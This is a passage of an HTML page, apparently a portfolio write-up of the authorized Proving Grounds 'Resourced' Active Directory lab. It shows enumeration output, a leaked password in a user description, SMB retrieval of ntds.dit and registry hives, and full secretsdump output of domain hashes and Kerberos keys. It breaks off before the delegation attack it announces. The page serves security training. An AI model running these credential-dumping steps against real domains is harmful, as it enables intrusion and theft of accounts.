@@ -1,0 +1,783 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab demonstrates enumerating a domain controller to identify sensitive files left on an SMB share, leading to credential retrieval and domain access. Learners will leverage Resource-Based Constrained Delegation (RBCD) to impersonate the domain administrator and gain full SYSTEM-level access to the domain controller. This lab emphasizes Active Directory enumeration, constrained delegation abuse, and administrative compromise techniques."><title>Proving Grounds: Resourced</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Active Directory</span><h1>Proving Grounds: Resourced</h1><p>This lab demonstrates enumerating a domain controller to identify sensitive files left on an SMB share, leading to credential retrieval and domain access. Learners will leverage Resource-Based Constrained Delegation (RBCD) to impersonate the domain administrator and gain full SYSTEM-level access to the domain controller. This lab emphasizes Active Directory enumeration, constrained delegation abuse, and administrative compromise techniques.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>Domain controller enumeration will reveal remnants of a password audit that will lead to shell access. Following this, a Resource-Based Constrained Delegation exploitation vector will be leveraged to elevate access to system privileges. This lab focuses on enumeration techniques and privilege escalation methods.</p>
+<h2 id="scenario">Scenario</h2>
+<p>This lab demonstrates enumerating a domain controller to identify sensitive files left on an SMB share, leading to credential retrieval and domain access. Learners will leverage Resource-Based Constrained Delegation (RBCD) to impersonate the domain administrator and gain full SYSTEM-level access to the domain controller. This lab emphasizes Active Directory enumeration, constrained delegation abuse, and administrative compromise techniques.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Enumerate the domain controller to identify accessible SMB shares.</li>
+<li>Retrieve and analyze sensitive files from the Password Audit share to extract domain user hashes.</li>
+<li>Use extracted hashes to authenticate and gain initial access to the domain.</li>
+<li>Create a new machine account and assign delegation rights using Resource-Based Constrained Delegation.</li>
+<li>Impersonate the domain administrator using a forged Kerberos ticket to gain SYSTEM access.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>(kali㉿kali)-[~/offsec/resourced]
+# Map exposed services and versions on the target.
+
+└─$ nmap -sCV -p- 192.168.170.175   
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-18 15:04 -0400
+Nmap scan report for 192.168.170.175
+Host is up (0.023s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-18 19:06:35Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=ResourceDC.resourced.local
+| Not valid before: 2026-06-17T19:02:46
+|_Not valid after:  2026-12-17T19:02:46
+| rdp-ntlm-info: 
+|   Target_Name: resourced
+|   NetBIOS_Domain_Name: resourced
+|   NetBIOS_Computer_Name: RESOURCEDC
+|   DNS_Domain_Name: resourced.local
+|   DNS_Computer_Name: ResourceDC.resourced.local
+|   DNS_Tree_Name: resourced.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2026-06-18T19:07:23+00:00
+|_ssl-date: 2026-06-18T19:08:03+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+49710/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-06-18T19:07:24
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 203.27 seconds</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ ldapsearch -x -H ldap://192.168.170.175 -s base
+## extended LDIF
+#
+## LDAPv3
+## base &lt;&gt; (default) with scope baseObject
+## filter: (objectclass=*)
+## requesting: ALL
+#
+
+#
+dn:
+domainFunctionality: 7
+forestFunctionality: 7
+domainControllerFunctionality: 7
+rootDomainNamingContext: DC=resourced,DC=local
+ldapServiceName: resourced.local:resourcedc$@RESOURCED.LOCAL
+isGlobalCatalogReady: TRUE
+supportedSASLMechanisms: GSSAPI
+supportedSASLMechanisms: GSS-SPNEGO
+supportedSASLMechanisms: EXTERNAL
+supportedSASLMechanisms: DIGEST-MD5
+supportedLDAPVersion: 3
+supportedLDAPVersion: 2
+supportedLDAPPolicies: MaxPoolThreads
+supportedLDAPPolicies: MaxPercentDirSyncRequests
+supportedLDAPPolicies: MaxDatagramRecv
+supportedLDAPPolicies: MaxReceiveBuffer
+supportedLDAPPolicies: InitRecvTimeout
+supportedLDAPPolicies: MaxConnections
+supportedLDAPPolicies: MaxConnIdleTime
+supportedLDAPPolicies: MaxPageSize
+supportedLDAPPolicies: MaxBatchReturnMessages
+supportedLDAPPolicies: MaxQueryDuration
+supportedLDAPPolicies: MaxDirSyncDuration
+supportedLDAPPolicies: MaxTempTableSize
+supportedLDAPPolicies: MaxResultSetSize
+supportedLDAPPolicies: MinResultSets
+supportedLDAPPolicies: MaxResultSetsPerConn
+supportedLDAPPolicies: MaxNotificationPerConn
+supportedLDAPPolicies: MaxValRange
+supportedLDAPPolicies: MaxValRangeTransitive
+supportedLDAPPolicies: ThreadMemoryLimit
+supportedLDAPPolicies: SystemMemoryLimitPercent
+supportedControl: 1.2.840.113556.1.4.319
+supportedControl: 1.2.840.113556.1.4.801
+supportedControl: 1.2.840.113556.1.4.473
+supportedControl: 1.2.840.113556.1.4.528
+supportedControl: 1.2.840.113556.1.4.417
+supportedControl: 1.2.840.113556.1.4.619
+supportedControl: 1.2.840.113556.1.4.841
+supportedControl: 1.2.840.113556.1.4.529
+supportedControl: 1.2.840.113556.1.4.805
+supportedControl: 1.2.840.113556.1.4.521
+supportedControl: 1.2.840.113556.1.4.970
+supportedControl: 1.2.840.113556.1.4.1338
+supportedControl: 1.2.840.113556.1.4.474
+supportedControl: 1.2.840.113556.1.4.1339
+supportedControl: 1.2.840.113556.1.4.1340
+supportedControl: 1.2.840.113556.1.4.1413
+supportedControl: 2.16.840.1.113730.3.4.9
+supportedControl: 2.16.840.1.113730.3.4.10
+supportedControl: 1.2.840.113556.1.4.1504
+supportedControl: 1.2.840.113556.1.4.1852
+supportedControl: 1.2.840.113556.1.4.802
+supportedControl: 1.2.840.113556.1.4.1907
+supportedControl: 1.2.840.113556.1.4.1948
+supportedControl: 1.2.840.113556.1.4.1974
+supportedControl: 1.2.840.113556.1.4.1341
+supportedControl: 1.2.840.113556.1.4.2026
+supportedControl: 1.2.840.113556.1.4.2064
+supportedControl: 1.2.840.113556.1.4.2065
+supportedControl: 1.2.840.113556.1.4.2066
+supportedControl: 1.2.840.113556.1.4.2090
+supportedControl: 1.2.840.113556.1.4.2205
+supportedControl: 1.2.840.113556.1.4.2204
+supportedControl: 1.2.840.113556.1.4.2206
+supportedControl: 1.2.840.113556.1.4.2211
+supportedControl: 1.2.840.113556.1.4.2239
+supportedControl: 1.2.840.113556.1.4.2255
+supportedControl: 1.2.840.113556.1.4.2256
+supportedControl: 1.2.840.113556.1.4.2309
+supportedControl: 1.2.840.113556.1.4.2330
+supportedControl: 1.2.840.113556.1.4.2354
+supportedCapabilities: 1.2.840.113556.1.4.800
+supportedCapabilities: 1.2.840.113556.1.4.1670
+supportedCapabilities: 1.2.840.113556.1.4.1791
+supportedCapabilities: 1.2.840.113556.1.4.1935
+supportedCapabilities: 1.2.840.113556.1.4.2080
+supportedCapabilities: 1.2.840.113556.1.4.2237
+subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=resourced,DC=loc
+ al
+serverName: CN=RESOURCEDC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Co
+ nfiguration,DC=resourced,DC=local
+schemaNamingContext: CN=Schema,CN=Configuration,DC=resourced,DC=local
+namingContexts: DC=resourced,DC=local
+namingContexts: CN=Configuration,DC=resourced,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=resourced,DC=local
+namingContexts: DC=DomainDnsZones,DC=resourced,DC=local
+namingContexts: DC=ForestDnsZones,DC=resourced,DC=local
+isSynchronized: TRUE
+highestCommittedUSN: 49215
+dsServiceName: CN=NTDS Settings,CN=RESOURCEDC,CN=Servers,CN=Default-First-Site
+ -Name,CN=Sites,CN=Configuration,DC=resourced,DC=local
+dnsHostName: ResourceDC.resourced.local
+defaultNamingContext: DC=resourced,DC=local
+currentTime: 20260618191011.0Z
+configurationNamingContext: CN=Configuration,DC=resourced,DC=local
+
+## search result
+search: 2
+result: 0 Success
+
+## numResponses: 2
+## numEntries: 1</code></pre><ul>
+<li><code>enum4linux</code></li>
+</ul>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ enum4linux -a 192.168.170.175
+
+...
+===============================( Getting domain SID for 192.168.170.175 )===============================
+                                                                                                                           
+Domain Name: resourced                                                                                                     
+Domain Sid: S-1-5-21-537427935-490066102-1511301751
+
+...
+======================================( Users on 192.168.170.175 )======================================
+                                                                                                                           
+index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
+index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
+index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
+index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
+index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
+index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
+index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
+index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
+index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
+index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
+index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
+index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[M.Mason] rid:[0x44f]
+user:[K.Keen] rid:[0x450]
+user:[L.Livingstone] rid:[0x451]
+user:[J.Johnson] rid:[0x452]
+user:[V.Ventz] rid:[0x453]
+user:[S.Swanson] rid:[0x454]
+user:[P.Parker] rid:[0x455]
+user:[R.Robinson] rid:[0x456]
+user:[D.Durant] rid:[0x457]
+user:[G.Goldberg] rid:[0x458]
+...</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ smbclient -L  ////192.168.170.175// -U v.ventz
+Password for [WORKGROUP\v.ventz]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+# Execute the next evidence-gathering step in the authorized lab.
+
+        ADMIN$          Disk      Remote Admin
+# Execute the next evidence-gathering step in the authorized lab.
+
+        C$              Disk      Default share
+# Execute the next evidence-gathering step in the authorized lab.
+
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Password Audit  Disk      
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.170.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>kali㉿kali)-[~/offsec/resourced]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ smbclient &#39;//192.168.170.175/password Audit&#39; -U v.ventz 
+Password for [WORKGROUP\v.ventz]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Tue Oct  5 04:49:16 2021
+  ..                                  D        0  Tue Oct  5 04:49:16 2021
+  Active Directory                    D        0  Tue Oct  5 04:49:15 2021
+  registry                            D        0  Tue Oct  5 04:49:16 2021
+
+                7706623 blocks of size 4096. 2621095 blocks available
+smb: \&gt; cd Active Directory\
+# Move into the directory needed for the next action.
+
+cd \Active\: NT_STATUS_OBJECT_NAME_NOT_FOUND
+smb: \&gt; dir
+  .                                   D        0  Tue Oct  5 04:49:16 2021
+  ..                                  D        0  Tue Oct  5 04:49:16 2021
+  Active Directory                    D        0  Tue Oct  5 04:49:15 2021
+  registry                            D        0  Tue Oct  5 04:49:16 2021
+
+                7706623 blocks of size 4096. 2621095 blocks available
+smb: \&gt; cd registry\
+smb: \registry\&gt; dir
+  .                                   D        0  Tue Oct  5 04:49:16 2021
+  ..                                  D        0  Tue Oct  5 04:49:16 2021
+  SECURITY                            A    65536  Mon Sep 27 06:45:20 2021
+  SYSTEM                              A 16777216  Mon Sep 27 06:45:20 2021
+
+                7706623 blocks of size 4096. 2621095 blocks available
+smb: \registry\&gt; get SECURITY
+getting file \registry\SECURITY of size 65536 as SECURITY (528.9 KiloBytes/sec) (average 528.9 KiloBytes/sec)
+smb: \registry\&gt; get SYSTEM
+getting file \registry\SYSTEM of size 16777216 as SYSTEM (1938.0 KiloBytes/sec) (average 1918.1 KiloBytes/sec)
+smb: \&gt; cd &quot;Active Directory&quot;
+smb: \Active Directory\&gt; dir
+  .                                   D        0  Tue Oct  5 04:49:16 2021
+  ..                                  D        0  Tue Oct  5 04:49:16 2021
+  ntds.dit                            A 25165824  Mon Sep 27 07:30:54 2021
+  ntds.jfm                            A    16384  Mon Sep 27 07:30:54 2021
+
+                7706623 blocks of size 4096. 2620691 blocks available
+smb: \Active Directory\&gt; get ntds.dit
+getting file \Active Directory\ntds.dit of size 25165824 as ntds.dit (2736.7 KiloBytes/sec) (average 2736.7 KiloBytes/sec)
+smb: \Active Directory\&gt; get ntds.jfm
+getting file \Active Directory\ntds.jfm of size 16384 as ntds.jfm (197.5 KiloBytes/sec) (average 2714.0 KiloBytes/sec)
+smb: \Active Directory\&gt; exit</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Execute the next evidence-gathering step in the authorized lab.
+
+└─$ impacket-secretsdump -system SYSTEM -security SECURITY -skip-sam -ntds ntds.dit LOCAL 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:507fdb105d9322cf53420c95780adf5f2dcdac7ca14f8b37188370c916a3fa6f2a511bb284aeac71211c939a866a2b4cc02c408e1d242ad4f5cc8f7b85d2448c18d23fb47f7b9b543a6cfb8999e40037f23dbfd8690869753979d15fe61bdcddb0ccff3d20c275207ca93e844c3b5aa1f658198225b3e54f90e0b71aaf76ba32bb1b598d189b6696c27d04674fd4c4f2c09d0df2e59fe93850aa928be813be3bd659f0d2ecba6e34fb5a3880db8155cf77e21eb44d63e1ae65abcc2aa5bdfb6bfe85e8590329929522aae501ba86d8622918e37b41daef8a2b00e78440d13e88a31fc14714923bba6fb99e13c81b3020
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd
+dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931
+[*] NL$KM 
+ 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.&gt;.J......I.
+ 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..
+ 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...
+ 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..
+NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
+M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
+K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
+V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
+S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
+P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
+R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
+D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
+G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:73410f03554a21fb0421376de7f01d5fe401b8735d4aa9d480ac1c1cdd9dc0c8
+Administrator:aes128-cts-hmac-sha1-96:b4fc11e40a842fff6825e93952630ba2
+Administrator:des-cbc-md5:80861f1a80f1232f
+RESOURCEDC$:aes256-cts-hmac-sha1-96:b97344a63d83f985698a420055aa8ab4194e3bef27b17a8f79c25d18a308b2a4
+RESOURCEDC$:aes128-cts-hmac-sha1-96:27ea2c704e75c6d786cf7e8ca90e0a6a
+RESOURCEDC$:des-cbc-md5:ab089e317a161cc1
+krbtgt:aes256-cts-hmac-sha1-96:12b5d40410eb374b6b839ba6b59382cfbe2f66bd2e238c18d4fb409f4a8ac7c5
+krbtgt:aes128-cts-hmac-sha1-96:3165b2a56efb5730cfd34f2df472631a
+krbtgt:des-cbc-md5:f1b602194f3713f8
+M.Mason:aes256-cts-hmac-sha1-96:21e5d6f67736d60430facb0d2d93c8f1ab02da0a4d4fe95cf51554422606cb04
+M.Mason:aes128-cts-hmac-sha1-96:99d5ca7207ce4c406c811194890785b9
+M.Mason:des-cbc-md5:268501b50e0bf47c
+K.Keen:aes256-cts-hmac-sha1-96:9a6230a64b4fe7ca8cfd29f46d1e4e3484240859cfacd7f67310b40b8c43eb6f
+K.Keen:aes128-cts-hmac-sha1-96:e767891c7f02fdf7c1d938b7835b0115
+K.Keen:des-cbc-md5:572cce13b38ce6da
+L.Livingstone:aes256-cts-hmac-sha1-96:cd8a547ac158c0116575b0b5e88c10aac57b1a2d42e2ae330669a89417db9e8f
+L.Livingstone:aes128-cts-hmac-sha1-96:1dec73e935e57e4f431ac9010d7ce6f6
+L.Livingstone:des-cbc-md5:bf01fb23d0e6d0ab
+J.Johnson:aes256-cts-hmac-sha1-96:0452f421573ac15a0f23ade5ca0d6eada06ae85f0b7eb27fe54596e887c41bd6
+J.Johnson:aes128-cts-hmac-sha1-96:c438ef912271dbbfc83ea65d6f5fb087
+J.Johnson:des-cbc-md5:ea01d3d69d7c57f4
+V.Ventz:aes256-cts-hmac-sha1-96:4951bb2bfbb0ffad425d4de2353307aa680ae05d7b22c3574c221da2cfb6d28c
+V.Ventz:aes128-cts-hmac-sha1-96:ea815fe7c1112385423668bb17d3f51d
+V.Ventz:des-cbc-md5:4af77a3d1cf7c480
+S.Swanson:aes256-cts-hmac-sha1-96:8a5d49e4bfdb26b6fb1186ccc80950d01d51e11d3c2cda1635a0d3321efb0085
+S.Swanson:aes128-cts-hmac-sha1-96:6c5699aaa888eb4ec2bf1f4b1d25ec4a
+S.Swanson:des-cbc-md5:5d37583eae1f2f34
+P.Parker:aes256-cts-hmac-sha1-96:e548797e7c4249ff38f5498771f6914ae54cf54ec8c69366d353ca8aaddd97cb
+P.Parker:aes128-cts-hmac-sha1-96:e71c552013df33c9e42deb6e375f6230
+P.Parker:des-cbc-md5:083b37079dcd764f
+R.Robinson:aes256-cts-hmac-sha1-96:90ad0b9283a3661176121b6bf2424f7e2894079edcc13121fa0292ec5d3ddb5b
+R.Robinson:aes128-cts-hmac-sha1-96:2210ad6b5ae14ce898cebd7f004d0bef
+R.Robinson:des-cbc-md5:7051d568dfd0852f
+D.Durant:aes256-cts-hmac-sha1-96:a105c3d5cc97fdc0551ea49fdadc281b733b3033300f4b518f965d9e9857f27a
+D.Durant:aes128-cts-hmac-sha1-96:8a2b701764d6fdab7ca599cb455baea3
+D.Durant:des-cbc-md5:376119bfcea815f8
+G.Goldberg:aes256-cts-hmac-sha1-96:0d6ac3733668c6c0a2b32a3d10561b2fe790dab2c9085a12cf74c7be5aad9a91
+G.Goldberg:aes128-cts-hmac-sha1-96:00f4d3e907818ce4ebe3e790d3e59bf7
+G.Goldberg:des-cbc-md5:3e20fd1a25687673
+[*] Cleaning up...</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># Read the file contents for useful configuration or credential data.
+
+└─$ cat hashes.txt | awk &#39;{print $1}&#39;
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
+M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
+K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
+L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
+J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
+V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
+S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
+P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
+R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
+D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
